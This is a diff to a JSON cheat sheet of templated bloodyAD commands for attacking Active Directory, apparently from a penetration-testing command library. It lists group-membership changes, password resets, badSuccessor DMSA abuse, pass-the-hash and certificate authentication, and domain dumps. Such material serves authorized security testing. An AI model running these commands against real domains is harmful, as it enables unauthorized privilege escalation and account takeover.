@@ -16,11 +16,6 @@
   "tool": "bloodyAD",
   "tags": ["AD", "LDAP", "ACL", "privesc", "RBCD", "shadow-creds", "ADCS"],
   "commands": [
-
-    // =========================
-    // ADD COMMANDS
-    // =========================
-
     { "desc": "Add user to group", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add groupMember '{{GROUP}}' {{TARGET_USER}}" },
     { "desc": "Add new user", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add user {{TARGET_USER}} '{{NEWPASS}}'" },
     { "desc": "Add new computer", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add computer {{HOSTNAME}} '{{NEWPASS}}'" },
@@ -31,11 +26,6 @@
     { "desc": "Add DNS record", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dnsRecord {{NAME}} {{IP}}" },
     { "desc": "Add UAC flag", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add uac {{TARGET}} -f {{FLAG}}" },
     { "desc": "Add badSuccessor DMSA", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add badSuccessor {{DMSA}}" },
-
-    // =========================
-    // GET COMMANDS
-    // =========================
-
     { "desc": "Get object attributes", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}}" },
     { "desc": "Get specific attribute", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}} --attr {{ATTR}}" },
     { "desc": "Get membership", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get membership {{TARGET}}" },
@@ -47,32 +37,13 @@
     { "desc": "DNS dump", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get dnsDump" },
     { "desc": "Domain trusts", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get trusts" },
     { "desc": "BloodHound collection", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get bloodhound" },
-
-    // =========================
-    // SET COMMANDS
-    // =========================
-
     { "desc": "Set password", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set password {{TARGET}} '{{NEWPASS}}'" },
-
-    // =========================
-    // REMOVE COMMANDS
-    // =========================
-
     { "desc": "Remove user from group", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove groupMember '{{GROUP}}' {{TARGET_USER}}" },
     { "desc": "Remove shadow credentials", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove shadowCredentials {{TARGET_USER}}" },
-
-    // =========================
-    // AUTH METHODS
-    // =========================
 
     { "desc": "Kerberos auth (ccache)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -k ccache={{CCACHE}} get object {{TARGET}}" },
     { "desc": "Pass-the-Hash", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p '{{LMHASH}}:{{NTHASH}}' get object {{TARGET}}" },
     { "desc": "Certificate auth", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -c '{{KEY}}:{{CERT}}' get object {{TARGET}}" },
-
-    // =========================
-    // MSLDAP IMPORTANT COMMANDS
-    // =========================
-
     { "desc": "MSLDAP whoami", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap whoami" },
     { "desc": "Dump all domain objects", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dump" },
     { "desc": "List Domain Admins", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dadms" },
